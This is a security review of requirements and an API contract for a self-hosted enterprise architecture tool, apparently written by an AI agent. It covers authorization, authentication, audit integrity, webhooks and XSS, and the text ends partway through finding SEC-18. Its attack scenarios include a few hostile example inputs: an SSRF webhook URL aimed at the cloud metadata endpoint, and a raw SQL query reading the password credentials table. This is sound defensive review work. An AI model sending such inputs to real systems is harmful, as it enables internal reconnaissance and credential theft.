# Security Review: Requirements Baseline (2026-10)

| Field | Value |
|---|---|
| Review type | Pre-implementation review of requirements, ADRs, API contract, data model |
| Reviewer | Security Engineer (agent) |
| Date | 2026-10-13 |
| Branch / commit | `docs/security-review` @ `9f4b805` |
| Scope | UC-01..UC-22, REQ-001..REQ-156, user stories, ADR-001..ADR-031, `api/openapi.yaml`, `docs/data-model.puml`, business objects (person, local-credential, system-admin-account, role, entity, entity-version), concept §20 and §21, `SECURITY.md`, `.github/workflows/ci.yml` |
| Out of scope | Code (none exists yet), Penpot mockups, OpenSpec changes |
| Result | **Sign-off granted once the listed findings are resolved** (see [Sign-off](#sign-off)) |

## Summary

The baseline takes authentication seriously in many places (anti-enumeration, setup token channel, passkey replay protection, credential separation, INSERT-only audit grants). The main gap is **authorization**: there is no permission model, the API contract carries no authorization information, and property-level visibility, the "mandatory" headline feature, is enforced only on the entity read path while history, audit, portal, aggregations, filters and webhooks leak the same values. In addition, session termination, brute-force protection, rendering of user content (Markdown, Mermaid, PlantUML, draw.io) in an Electron client, and the integrity of the audit trail against the application itself are not specified to a level an implementer can test.

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 13 |
| Medium | 16 |
| Low | 2 |
| **Total** | **32** |

37 proposed requirements are listed in [Proposed Requirements](#proposed-requirements).

### Findings overview

| ID | Title | Severity | Category |
|---|---|---|---|
| SEC-01 | No authorization model; API contract has no per-operation authorization | Critical | gap |
| SEC-02 | Property-level visibility bypassable via secondary read channels; API model contradicts REQ-124 | High | weakness |
| SEC-03 | Users can grant themselves access to restricted properties | High | weakness |
| SEC-04 | Write paths bypass property write protection | Medium | weakness |
| SEC-05 | Anonymous / "public instance" access is undefined | High | gap |
| SEC-06 | No logout, revocation, timeouts or propagation of offboarding to sessions | High | gap |
| SEC-07 | OIDC relying-party hardening missing; identity matched by e-mail | High | weakness |
| SEC-08 | Remote system-admin mapping relies on mutable claim values | High | weakness |
| SEC-09 | No brute-force protection, lockout or TOTP replay protection for local auth | High | gap |
| SEC-10 | Most privileged accounts are exempt from MFA | High | weakness |
| SEC-11 | No re-authentication for sensitive account actions | Medium | gap |
| SEC-12 | Account recovery and temporary password lifecycle undefined | Medium | gap |
| SEC-13 | Audit trail is not tamper-resistant against the application and its admins | High | weakness |
| SEC-14 | Security event logging incomplete | Medium | gap |
| SEC-15 | Machine identities: two overlapping mechanisms, no scoping or expiry | Medium | weakness |
| SEC-16 | Webhooks: SSRF and data leakage | Medium | weakness |
| SEC-17 | Raw SQL / Cypher query endpoints planned | High | weakness |
| SEC-18 | Stored XSS through Markdown, Mermaid, PlantUML, draw.io and SVG | High | gap |
| SEC-19 | Electron hardening and update integrity incomplete | High | weakness |
| SEC-20 | Development JWT stub and insecure defaults can reach production | High | weakness |
| SEC-21 | Import / file parsing not hardened | Medium | gap |
| SEC-22 | CEL evaluation not bounded | Medium | weakness |
| SEC-23 | No rate limiting or resource quotas | Medium | gap |
| SEC-24 | No HTTP security baseline (headers, CORS, CSRF, cookies, error handling) | Medium | gap |
| SEC-25 | SSE stream authorization underspecified | Low | weakness |
| SEC-26 | Secrets and encryption key management undefined | Medium | gap |
| SEC-27 | REQ-129 encryption requirement contradictory and partly untestable | Medium | weakness |
| SEC-28 | GDPR for personal data of OEA users and modeled persons | Medium | gap |
| SEC-29 | Supply chain and release integrity | Medium | gap |
| SEC-30 | Screenshot workflow (ADR-031) runs third-party code with write access to `main` | Medium | weakness |
| SEC-31 | OpenAPI security contract incomplete and inconsistent | Medium | weakness |
| SEC-32 | SECURITY.md contact is a placeholder and claims contradict the baseline | Low | weakness |

## Threat Model Assumptions

The review uses the assumptions given by the caller. Items marked **Flag** are where the baseline itself contradicts or extends an assumption.

| # | Assumption | Assessment |
|---|---|---|
| A1 | Self-hosted by organizations (Docker Compose), single organization per instance, not multi-tenant SaaS | Accepted. **Flag**: REQ-129 Context says "Applies to all deployment scenarios (self-hosted, SaaS)". REQ-075 also names Kubernetes/Helm. Findings assume Compose and Kubernetes; SaaS is out of scope until clarified. |
| A2 | Users: architects, business analysts, operators, viewers; OIDC IdP (Entra ID, Authentik) or local accounts with TOTP/passkey | Accepted. **Flag**: local password-only login (REQ-011) and **LDAP** (`AuthProvider.type: ldap`, `api/openapi.yaml` l. 982; `SECURITY.md` "OIDC/LDAP") also exist. LDAP is not covered by ADR-006. |
| A3 | Clients: Electron desktop client (full modeling) and browser web portal (read-only) | Accepted. **Flag**: ADR-008 states portal consumers need "no login effort, just a link"; REQ-056 and UC-07 describe a "public instance" without login. The web portal must therefore be assumed to be **reachable from outside the corporate network**, possibly anonymously (see SEC-05). The Electron client caches data offline (ADR-008), so endpoint devices hold repository data. |
| A4 | Machine access: service accounts with client credentials (ADR-026), API keys (REQ-002) | Accepted. **Flag**: the two mechanisms overlap; API keys have no data model (see SEC-15). Webhooks (REQ-147) add outbound calls from the server. |
| A5 | Data: EA data incl. GDPR processing information and security classifications; personal data of users | Accepted. Security classifications, open vulnerabilities and risk scores (concept §20.4) make the repository a **reconnaissance target**: a leaked "where are our weakest systems" view is valuable to an attacker. Severity ratings reflect that. |
| A6 | (added) Operators/system admins are trusted to run the instance but must not be able to silently alter or erase the audit trail | Derived from REQ-151 and ADR-024 (DORA/ISO 27001 motivation). Please confirm (see [Open Questions](#open-questions)). |
| A7 | (added) Attackers considered: external unauthenticated attacker on the internet-reachable portal/API; authenticated low-privilege user (viewer, architect) trying to escalate or read restricted data; compromised CI secret of a service account; malicious content imported via files or written by another user; compromised npm/Maven dependency | Used for all attack scenarios below. |

## Findings

Severity follows impact × likelihood under the threat model. "Gap" = security requirement missing entirely; "weakness" = an existing artifact is insecure, contradictory or not testable.

### SEC-01: No authorization model; API contract has no per-operation authorization

- **Severity**: Critical
- **Category**: gap
- **Affected artifacts**:
  - `api/openapi.yaml` l. 27–39 (only global `bearerAuth`, no roles/scopes per operation); most operations do not declare `401`/`403` (e.g. `/views/catalog/{id}` l. 1154, `/views/diagrams/{id}` l. 1198, `/entities/{id}/history` l. 1306, `/audit/events/{id}/changes` l. 2306, `/entities/{id}` PUT/PATCH/DELETE l. 2369–2456, `/admin/continuum/import` l. 1939, `/admin/service-accounts` POST l. 2123)
  - Authorization appears only as prose: "Requires role `Architect` or higher" (l. 1337; no role called "Architect" exists and there is no hierarchy), "Requires role `Auditor` or `Admin`" (l. 2265; no "Admin" role exists in `docs/data-model.puml` l. 105–115)
  - Tag "Entities – Write" (l. 2917–2921): write endpoints "require ... role `integration-writer`" and a feature flag – contradicts ADR-008 where human architects write through the Electron client
  - `business-objects/role.md`: `permissionLevel: read|write|admin` "per resource" without any resource list; concept §21.8 lists special permissions (`schema-modify`, `plateau-create`, `waiver-grant`) that appear in no requirement; UC-04 Open Questions "Which role authorizes metamodel editing?"
  - Concept §21.8: "Roles in the metamodel ... can be used directly as authorization roles" – mixes business roles (EA content) and security roles
  - No use case or requirement for managing roles and role assignments (UC-01 "Out of Scope": "Management of roles and role assignments themselves (separate use case)")
  - No requirement has `type: security`
- **Attack scenario**: Implementation starts with the walking skeleton (catalog, entities, admin bootstrapping). Each developer decides per controller which role is needed. A viewer calls `PUT /entities/{id}`, `POST /admin/metamodel/import` or `GET /audit/events/{id}/changes` directly with their bearer token. Because the contract carries no authorization and tests are generated from it, nothing fails; broken function-level and object-level authorization (OWASP API1/API5) ships. Separately: if the concept sentence is implemented literally, an architect with write access to EA content who edits Role entities or role assignments in the model grants themselves `admin`.
- **Recommendation**:
  1. Add PR-01 (permission model), PR-02 (deny-by-default enforcement, contract annotation), PR-03 (object-level authorization).
  2. In `api/openapi.yaml`: add an `x-required-permissions` (or OAuth scope) declaration to **every** operation; add `401`/`403` responses everywhere; replace the prose role hints; add a CI check that fails if an operation lacks the annotation.
  3. Resolve the "Entities – Write" contradiction: either the write endpoints are used by humans and service accounts (with permission `entity:write`), or there are separate endpoints. Remove the "requires role `integration-writer`" sentence from the tag.
  4. Change concept §21.8 so that authorization roles (`roles` table, system-managed) are explicitly separate from business roles modeled as EA content, and only users with `role:assign` can create `person_roles` rows.
  5. Create a use case "Manage roles and role assignments" (owner: business engineer / requirements engineer).

### SEC-02: Property-level visibility bypassable via secondary read channels; API model contradicts REQ-124

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**:
  - REQ-126 Statement / AC1–AC5 and REQ-127 AC1–AC4: masking defined only for "the entity API" and catalog columns
  - `api/openapi.yaml`: `EntityHistoryResponse`/`FieldDiff.oldValue/newValue` (l. 581–615, `/entities/{id}/history` l. 1306); `AuditEventChange.oldValue/newValue` (l. 860–867) via `/audit/events` and **`/portal/audit/events`** (l. 2845–2878, "filtered to publicly visible event types" – undefined); `/views/dashboards/{id}/data`, `/portal/dashboards/{id}/data`; `/views/lineage/{id}`; `/views/roadmap/{id}`; `BatchWriteResponse`, `EntityDetail` responses of write endpoints; `/admin/metamodel/export`
  - REQ-053 (property aggregation with `sum|count|avg|min|max`, `groupBy`, `filters`), REQ-047 (ad-hoc filters on any attribute), `SortParam` (l. 79–83), REQ-070 (`/entities/search`), REQ-147 webhook payload `diff`, concept §21.5 event stream
  - ADR-024 `audit.event_changes.old_value/new_value TEXT` plaintext; concept §21.8 requires "for sensitive data: hash instead of plaintext"
  - `PropertyVisibilityEntry` (l. 905–916) models `visibilityByRole: always|default|hidden` – a **display** model that does not match REQ-124 (`public|role-restricted|connection-scoped`, `allowedRoles`, `scopingConnectionType`); `PropertyDefinitionDetail/Write` (l. 193–226) has no visibility fields at all
  - ADR-008 offline cache in the Electron client
- **Attack scenario**: A viewer without the `ISO` role opens entity 42. `GET /entities/42` correctly returns `securityClassification: null`. The viewer then calls `GET /entities/42/history` and reads every old and new value of `securityClassification` from `FieldDiff`. Alternatives: `GET /views/catalog?filter[securityClassification]=restricted` (filter oracle), a KPI widget `max(investmentCostForecast)` filtered to one entity, `/portal/audit/events?entityId=42`, or registering a webhook that receives the `diff`. A portal implementer who follows the contract implements `always/default/hidden` as a UI preference and never applies REQ-126 at all.
- **Recommendation**:
  1. Add PR-04 (visibility on all read channels) and treat it as an acceptance gate for every new read endpoint.
  2. `api/openapi.yaml`: replace `PropertyVisibilityEntry` by the REQ-124 model (`visibilityMode`, `allowedRoles[]`, `scopingConnectionType`); add these fields to `PropertyDefinitionDetail`/`Write`; add `redacted: boolean` to `PropertyValue` and `FieldDiff` so clients can distinguish "masked" from "empty" without seeing the value.
  3. ADR-024: store `old_value/new_value` of restricted properties encrypted or as a keyed HMAC (plain SHA-256 of an enum like `public|internal|confidential` is trivially reversible); expose them only to readers who pass the visibility check.
  4. REQ-126 AC5: extend "sorting and filtering disabled" to ad-hoc filters, saved filters, join filters, dashboard aggregations and `groupBy` (server-side, not only in the UI).
  5. Define what `/portal/audit/events` returns (event types, no `changes`, no `actorEmail`) or remove it.

### SEC-03: Users can grant themselves access to restricted properties

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**:
  - REQ-127 Statement / Traversal logic: access derives from any connection of `scopingConnectionType` between the user's Person entity and the target
  - REQ-128 Statement / AC3: override role list "configurable in the metamodel editor (EA manager can add or remove further roles)"
  - REQ-125 / `/admin/property-visibility` PUT (l. 1781): no statement who may change visibility; UC-04 open question on metamodel editor role
  - REQ-124: one `allowedRoles` list for read **and** write; concept §20.9/§21.8 require separate `read` and `write` lists
  - ADR-026 / REQ-154: `integration-writer` can create connections of any type
- **Attack scenario**: (a) Michael, an architect with entity write permission, creates a `DomainAssignment` connection from his Person entity to the HR system and reads its `securityClassification` within the 60 s cache TTL. (b) An EA manager with metamodel editor rights adds their own role to the override list (REQ-128 AC3) and reads all restricted values; or simply sets `visibilityMode=public`. (c) A compromised CI token of a service account creates scoping connections in batch. In each case the control is circumvented by the people it is meant to restrict.
- **Recommendation**: Add PR-05. Concretely: creating, changing or deleting connections of any type that is used as `scopingConnectionType` requires a dedicated permission (e.g. `visibility-scope:assign`) and is audited; the override role list and `visibilityMode` changes are system-admin-only (not metamodel editor), audited, and changes to them by the same person who benefits trigger a warning or four-eyes approval (concept §20.11); split `allowedRoles` into `readRoles`/`writeRoles` in REQ-124.

### SEC-04: Write paths bypass property write protection

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**:
  - REQ-126 AC3 / REQ-127 AC3 cover `PATCH` only
  - `PUT /entities/{id}` (l. 2370, full replace), `PUT /entities/by-external-id/{externalId}` (l. 2459), `POST /entities/batch` (l. 2519), `POST /entities/{id}/restore` (l. 1331; REQ-101, REQ-104/105 partial restore), `MetatypePropertyMapping.defaultValue` (l. 240–248), `POST /admin/metamodel/import`
  - `/views/catalog` parameter `deleted: true|only` (l. 1126) not restricted, while ADR-019 limits `includeDeleted` to admins
  - `PropertyWriteValue` reference values `"<entityId>"` (l. 642) – no check that the writer may see the referenced entity
- **Attack scenario**: An architect without the `ISO` role restores entity 42 to version 3 (REQ-101). The restore rewrites `securityClassification` from `restricted` back to `public` – a value the architect may neither read nor write. Or they `PUT` the entity (received with `null` for the masked field) and the server interprets `null`/missing as "clear the value". A viewer lists soft-deleted entities via `deleted=only`.
- **Recommendation**: Add PR-06. Update REQ-101/REQ-105: restore skips properties the actor may not write and reports them as "not restored (insufficient permission)". Define in `api/openapi.yaml` that on `PUT` masked properties the caller may not write are preserved, not cleared. Restrict `deleted` on `/views/catalog` to the permission defined for ADR-019 (currently "admin role").

### SEC-05: Anonymous / "public instance" access is undefined

- **Severity**: High
- **Category**: gap
- **Affected artifacts**: REQ-003 ("publicly readable content", `PUBLIC_READ_ONLY`), REQ-056 "Web portal (public instance)", UC-07 Basic Flow step 1 and Open Questions, ADR-008 Context ("no login effort, just a link"), `api/openapi.yaml` l. 10 "Portal API ... reduced auth scope (portal-reader)" – `portal-reader` exists nowhere else
- **Attack scenario**: An operator wants the CIO to see dashboards without login and enables a "public" flag that nobody specified. The implementation exempts `/api/v1/portal/**` from authentication. Because the portal endpoints take an entity, diagram or dashboard ID, an internet user enumerates integer IDs on `/portal/catalog/{id}` and `/portal/diagrams/{id}` and downloads the application landscape including data flows and protection needs. Equally, REQ-003 grants authenticated users without a role "public" content without anyone defining what "public" is.
- **Recommendation**: Add PR-07. Decide explicitly (open question Q1): either no anonymous access in v1 (simplest; recommended) or an opt-in, default-off mode with an explicit per-object publication flag, a fixed `anonymous` principal that is subject to the same property visibility rules, and a warning in the admin UI. Define `portal-reader` as a role in `docs/data-model.puml` or remove it from `api/openapi.yaml`.

### SEC-06: No logout, revocation, timeouts or propagation of offboarding to sessions

- **Severity**: High
- **Category**: gap
- **Affected artifacts**: REQ-001 (AC4 adopts IdP token lifetime "unchanged"; no logout), REQ-004 (checks only at login), REQ-003 AC2 (role changes apply "when they log in again or the session is refreshed"), REQ-012 (refresh token default `P7D`, no rotation, no revocation, no idle timeout), REQ-031 (reset does not end sessions), REQ-083 (lists "logout" as audited event although no logout exists), `SystemSettings.sessionTimeoutMin` (l. 1024) contradicts REQ-001 AC4, `docs/sprint-plan.md` "token storage after security review", person lifecycle `inactive` (`business-objects/person.md`) not checked by REQ-004; `docs/data-model.puml` has only `persons.active`, no lifecycle status and no session/refresh-token store
- **Attack scenario**: (a) An employee is offboarded at 09:00 (`offboarded` in OEA, IdP account still active for days, the case REQ-004 is written for). Their Electron client holds a refresh token valid for up to 7 days or an IdP refresh token valid for 90 days (Entra default); they keep exporting the landscape. (b) A laptop is stolen; the admin resets the password (REQ-031) but the existing sessions continue. (c) A user on a shared kiosk cannot log out. (d) A person set to `inactive` (parental leave, "temporarily without access") can still log in because only `offboarded` is rejected.
- **Recommendation**: Add PR-08 (termination and revocation) and PR-09 (timeouts and token storage). Update REQ-004 to reject every lifecycle status other than `active`/`invited`, and add `persons.status` to `docs/data-model.puml` and `person.md` (currently only `active: boolean`). Remove `sessionTimeoutMin` from `SystemSettings` or define its relation to REQ-001 AC4 (recommended: OEA's own session lifetime is always capped by OEA, independent of IdP token lifetime; IdP tokens are only used to establish the OEA session).

### SEC-07: OIDC relying-party hardening missing; identity matched by e-mail

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**: REQ-001 Processing ("Match the identity claims", state/nonce only), REQ-004 Inputs ("e.g., email, subject ID"), `person.md` (`email` "Primary contact and login identity"), `docs/data-model.puml` l. 43 (`persons.email {UQ}`), ADR-006 (generic OIDC with "any further RFC-compliant IdP"), ADR-009 (Electron, no flow specified), `AuthProviderWrite.claimMappings` (l. 1000)
- **Attack scenario**: (a) OEA maps the login to a Person via the `email` claim. In Entra ID, `email` is a mutable, unverified attribute (the "nOAuth" pattern); with multi-tenant app registrations or a second configured provider (ADR-006 allows several), an attacker sets `email=kurt@example-sme.com` in a tenant they control and logs in as Kurt. In Authentik, users can often edit their own e-mail. (b) The Electron client is a public client; without PKCE an authorization code intercepted via a custom URL scheme handler of another local app is redeemed. (c) Tokens issued for another application of the same IdP (wrong `aud`) are accepted because only the signature is checked ("local signature check against the provider's JWKS").
- **Recommendation**: Add PR-10. Bind Person to the immutable pair (`iss`, `sub`) (Entra: `tid`+`oid`), store it in `persons.external_ref_system/external_ref_id`, never match on e-mail alone; if just-in-time linking by e-mail is wanted, require `email_verified=true` plus an admin-confirmed first link. Mandate authorization code flow with PKCE (S256) for all clients, RFC 8252 (system browser + loopback redirect) for Electron, validation of `iss`, `aud`, `exp`, `nbf`, `nonce`, `azp`, allowed algorithms (no `none`, no HS* with JWKS), and single-tenant configuration for Entra by default.

### SEC-08: Remote system-admin mapping relies on mutable claim values

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**: REQ-014 (claimType group|role, `claimValue` "name of the group/role"), `system-admin-account.md` Example 2 (`claimValue: "oea-system-admins"`), REQ-018, ADR-006 Follow-up Decisions
- **Attack scenario**: The mapping is configured with the group **display name** `oea-system-admins`. In many Entra tenants every user may create Microsoft 365 groups; display names are not unique. A user creates a group with that name, adds themselves, configures the app to emit group names (or OEA reads them via Graph), logs in, and receives system admin rights. With Authentik, a user-editable attribute mapped into a `groups`-like claim has the same effect. In Entra, users with more than 200 groups receive an overage claim instead of `groups`, so legitimate admins silently lose access (lockout, UC-02 E4).
- **Recommendation**: Add PR-11. Update REQ-014: `claimValue` must be an immutable identifier (Entra group object ID, Authentik group UUID or a provider-controlled role/app-role claim); claim accepted only from the configured issuer; overage handled explicitly (fail closed + log). Update the example in `system-admin-account.md`.

### SEC-09: No brute-force protection, lockout or TOTP replay protection for local auth

- **Severity**: High
- **Category**: gap
- **Affected artifacts**: REQ-010 / REQ-011 (rate limiting only in "Implementation Notes"), REQ-022 (accepts ±1 step, no replay check), REQ-030 (N TOTP credentials multiply the guess probability by N), REQ-028 (no breached-password check; `expiryDays` forced rotation contradicts NIST SP 800-63B), REQ-024 / `local-credential.md` ("argon2id or bcrypt" without parameters; bcrypt silently truncates at 72 bytes while REQ-027 generates up to arbitrary length), REQ-013 local system admin password, REQ-006 (constant-time requirement exists but no lockout behavior that keeps it)
- **Attack scenario**: The portal/API is internet-reachable (A3). An attacker sprays common passwords against all usernames of an instance with REQ-011 enabled, or – after phishing a password – brute-forces the 6-digit TOTP: with ±1 window and no throttling, 3 valid codes out of 10^6 per 30 s means about 50 % success after roughly 230,000 requests, i.e. about 10–20 minutes at a few hundred requests per second. A user with 5 TOTP credentials (REQ-030) is 5 times faster to break. An observed TOTP code (shoulder-surfing, phishing proxy) can be replayed within its validity window.
- **Recommendation**: Add PR-12 (throttling and lockout), PR-13 (password storage and quality), PR-14 (TOTP replay). Move rate limiting from implementation notes to acceptance criteria. Lockout must not create an enumeration oracle (REQ-006): apply the same throttling to non-existent usernames, and use progressive delays rather than hard account lockout to avoid denial of service against named users.

### SEC-10: Most privileged accounts are exempt from MFA

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**: REQ-020 Statement / AC2 (system admin account exempt), `system-admin-account.md` BR-03, REQ-029 Rationale ("Administrators ... often need unrestricted access"), AC1 example `twoFactorExemptRoles=['administrator']`, AC3 ("at least one exempt role suffices"), REQ-031 AC6 (no reset path for the system admin password either)
- **Attack scenario**: The local bootstrap admin (REQ-013) has a password and no second factor, by design, permanently. It is reachable through the same login page as everyone else. A guessed, reused or phished admin password gives full control of the instance including auth provider configuration (`/admin/auth/providers`), service accounts and audit retention. REQ-029 makes it worse: the operator is invited to exempt exactly the administrator role, and because one exempt role suffices, assigning any exempt role to a person removes MFA from all their other, possibly privileged, roles.
- **Recommendation**: Add PR-15. Keep the bootstrap exemption only for the **first** login (to break the chicken-and-egg problem) and force MFA enrollment for the local system admin account at that login (REQ-013/REQ-020). Reverse REQ-029: exemptions must never apply to roles with `admin` permission or to accounts holding any non-exempt role ("all roles exempt" instead of "at least one"). Update `system-admin-account.md` BR-03.

### SEC-11: No re-authentication for sensitive account actions

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: REQ-026 ("the session MUST serve as proof of authentication"; Trade-offs accept the risk), REQ-031, REQ-155 (credential rotation), admin endpoints for auth providers and service accounts
- **Attack scenario**: An attacker obtains a session (XSS per SEC-18, stolen device with unlocked client, session token from a log). Within the session lifetime they register their own passkey (REQ-026) and thereby keep access after the session expires and after the victim changes their password. With an admin session they create a service account and obtain a long-lived client secret.
- **Recommendation**: Add PR-16: step-up re-authentication (fresh login within e.g. 5 minutes, or WebAuthn assertion) before adding/removing credentials, changing passwords, creating/rotating service account secrets, changing auth providers; notify the account owner (in-app and in the audit log) when a credential is added or removed.

### SEC-12: Account recovery and temporary password lifecycle undefined

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: REQ-024 (initial password: no expiry, no mandatory change – "recommended"), REQ-031 (forced change, but old sessions and second factors untouched; any admin can reset any other admin), UC-03 Out of Scope ("Recovery codes ... separate use case"), UC-02 E4 / Open Questions (break-glass "CLI command with direct database access?"), `local-credential.md` Open questions (recovery codes)
- **Attack scenario**: (a) The admin sends Kurt's initial password by chat; it remains valid indefinitely. Whoever uses it first completes just-in-time enrollment (UC-03) with **their** TOTP and owns the account. (b) A malicious or compromised admin resets another admin's password, logs in with it, and the victim's TOTP still works only for the victim – but because REQ-031 does not require the second factor after reset, the attacker gets in. (c) A user loses their only phone; with no recovery path, operators improvise direct database edits that are not audited.
- **Recommendation**: Add PR-17. Initial and reset passwords: single use, expiry (e.g. 72 h), mandatory change; reset revokes all sessions and requires re-enrollment or the existing second factor; resetting an account with `admin` permission requires the system admin (not a peer admin) and is audited with high severity. Specify recovery codes (or admin-initiated factor reset with re-enrollment) and an audited break-glass CLI for UC-02 E4.

### SEC-13: Audit trail is not tamper-resistant against the application and its admins

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**:
  - ADR-024 "Database Permissions": `GRANT INSERT`/`REVOKE UPDATE, DELETE` for `oea_app` – but the schema is created by Flyway (ADR-015, ADR-027 single datasource); if Flyway runs as `oea_app`, that user **owns** the tables and the REVOKE has no effect for an owner. REQ-151 AC1 would still pass if tested with a non-owner.
  - `SystemSettings.auditRetentionDays` (l. 1026) writable via `PUT /admin/settings` (l. 2237); ADR-024 cleanup job deletes `WHERE occurred_at < NOW() - INTERVAL` using that value
  - ADR-024 "Tamper Chain (optional, Enterprise)" – Community has no tamper evidence; "Denormalization for Tamper Evidence" does not provide tamper evidence (it provides completeness)
  - ADR-026 §7: `agent_id` "from the `X-Agent-Id` request header or the JWT claim" – client-controlled
  - Contradictions: REQ-083 (≥ 2 years, AC2 "no automatic deletion by the system", AC1 `entity_versions` append-only) vs ADR-024 (default 7 years, cleanup job; `entity_property_value_history` app READ+WRITE) vs concept §21.8 ("hash instead of plaintext" for sensitive values)
  - REQ-016: bootstrapping audit "via a local log file or database" – no integrity requirement for that log
- **Attack scenario**: A system admin (or an attacker with an admin session, SEC-10) sets `auditRetentionDays=1`, waits for the nightly cleanup job, and the trail of their changes to auth providers and visibility is gone – with no record because the setting change itself is not required to be audited. Alternatively an SQL injection or RCE in the app (running as table owner) rewrites `audit.events`. A service account sets `X-Agent-Id: human-ui` to disguise automated writes.
- **Recommendation**: Add PR-18. In ADR-024: separate migration/owner role (`oea_owner`, used only by Flyway) from runtime `oea_app`; enforce a non-configurable minimum retention floor (e.g. the REQ-083 value) that the API cannot go below; audit every change of the retention setting; make the hash chain available in Community (it is cheap and the main tamper-evidence mechanism) or document a supported external WORM/SIEM export; derive `agent_id` only from the authenticated client (`client_id`), keep `X-Agent-Id` as an untrusted informational field. Reconcile REQ-083, REQ-151 and ADR-024 into one retention and immutability statement.

### SEC-14: Security event logging incomplete

- **Severity**: Medium
- **Category**: gap
- **Affected artifacts**: REQ-005 (login), REQ-016 (bootstrap), REQ-025 (enrollment), REQ-031 (reset), REQ-128 AC2 (override reads) – no requirement for: logout, session revocation, failed authorization (403), role/role-assignment changes, auth provider changes, visibility configuration changes, service account create/rotate/use, API key use, settings changes, exports/bulk reads, rate-limit/lockout events; REQ-025 AC4 still references the rejected enrollment token; no requirement against PII/secret leakage in application logs (`SECURITY.md` claims "Structured logs without PII leaks"); no SIEM export requirement (concept §21.8 "Exportable")
- **Attack scenario**: A viewer probes 2,000 entity IDs on admin endpoints over a weekend; nothing records the 403 storm. An insider grants themselves a role (SEC-01) and later reverts it; no trace exists. An incident responder cannot reconstruct which service account wrote which entities because only `source=API` was logged.
- **Recommendation**: Add PR-19. Fix REQ-025 AC4 (remove enrollment-token case or replace by "invalid required-action state").

### SEC-15: Machine identities: two overlapping mechanisms, no scoping or expiry

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**: REQ-002 (API keys; storage, rotation, scoping only in Trade-offs/notes), REQ-008 AC2 (10,000 API keys) – no table in `docs/data-model.puml`; REQ-155 / ADR-026 / `machine_credentials` (no expiry, no last-rotation enforcement, token lifetime of issued JWT unspecified, token endpoint not in `api/openapi.yaml`); `ServiceAccountWrite.roles` (l. 841) accepts any role names while ADR-026 says "integration-writer (no admin operations)"; REQ-153 / ADR-026 §1 `external_id` unique instance-wide but not bound to the writing account; entity writes by `integration-writer` are not restricted to entities that account created
- **Attack scenario**: A CI secret of the "ci-scanner" service account leaks from a pipeline log. It never expires, and the account may write any entity: the attacker upserts `k8s:prod/order-service` owned by the CMDB importer, changes lifecycle and owners of human-curated entities, or creates `DomainAssignment` connections (SEC-03). If an admin assigned extra roles through the unrestricted `roles` array, the secret is an admin credential.
- **Recommendation**: Add PR-20 (credential lifecycle) and PR-21 (`external_id` ownership). Decide to keep one mechanism (recommended: OAuth2 client credentials per REQ-155; mark REQ-002 as superseded or define API keys as the same `machine_credentials` with prefix + hash). In `api/openapi.yaml` restrict `ServiceAccountWrite.roles` to an enum of roles flagged `assignable_to_service_accounts`.

### SEC-16: Webhooks: SSRF and data leakage

- **Severity**: Medium
- **Category**: weakness
- **Affected artifacts**: REQ-147 Webhook Mechanism (registration `POST /api/v1/webhooks` with arbitrary `url`, payload `diff`, `secret` storage unspecified, no permission), concept §21.4 `/events/subscriptions`; not in `api/openapi.yaml`. Related outbound calls: `plantumlServerUrl` (REQ-068), `/admin/auth/providers/{id}/test` (l. 2084, fetches `issuerUrl`)
- **Attack scenario**: A user allowed to register webhooks registers `http://169.254.169.254/latest/meta-data/iam/...` or `http://db:5432` (Compose service name). The retry logic and the delivery log reveal responses or reachability of internal hosts (blind SSRF/port scan). A webhook on `entity.updated` receives `diff` values of restricted properties regardless of the registrant's visibility (SEC-02).
- **Recommendation**: Add PR-22 (outbound request controls) and apply PR-04 to webhook payloads (payload filtered by the registrant's permissions, or ID-only payload with fetch-back). Webhook registration requires a dedicated permission; secrets stored encrypted (PR-32).

### SEC-17: Raw SQL / Cypher query endpoints planned

- **Severity**: High
- **Category**: weakness
- **Affected artifacts**: ADR-013 Decision table ("Analytics: `POST /api/v1/analytics/query` (SQL analytics, §22)"), concept §22 (`/api/v1/graph/cypher`, "SQL or SQL-like for analytics", "advanced users reach for Cypher/SQL"), concept §21.4
- **Attack scenario**: An authenticated viewer submits `SELECT * FROM password_credentials` or `SELECT value_text FROM entity_property_value_history WHERE ...` to the analytics endpoint. Even with a read-only DB role, row- and property-level authorization (REQ-126/127) cannot be enforced on arbitrary SQL, and PostgreSQL functions (`pg_read_file`, `dblink`, `COPY ... PROGRAM` for superusers) widen the impact. Expensive queries become a denial-of-service vector.
- **Recommendation**: Add PR-23. Amend ADR-013 and concept §22: no endpoint accepts raw SQL or Cypher from clients in v1; analytics use a typed, server-compiled query model (like the catalog filter model) that passes through the same authorization layer. If a raw query feature is ever wanted, it needs its own ADR with a sandboxed, authorization-aware projection (e.g. per-user materialized views).

### SEC-18: Stored XSS through Markdown, Mermaid, PlantUML, draw.io and SVG

- **Severity**: High
- **Category**: gap
- **Affected artifacts**: REQ-068 (Markdown + Mermaid client-side + PlantUML server/WASM; "SVG rendering: always sanitized" only as Implementation Note, no AC for Markdown links/HTML), REQ-070 (names "HTML-escaped" only in notes), REQ-078 Security section (`sandbox="allow-scripts allow-same-origin"`, `embed.diagrams.net`, postMessage bridge without origin check, sanitization by element list while draw.io labels with `html=1` carry HTML in the `value` attribute), REQ-080 (spell checking, possibly external service), entity names/descriptions everywhere, i18n labels set by admins, Penpot/Storybook irrelevant; no Content-Security-Policy requirement anywhere; ADR-009 Electron renders the same content
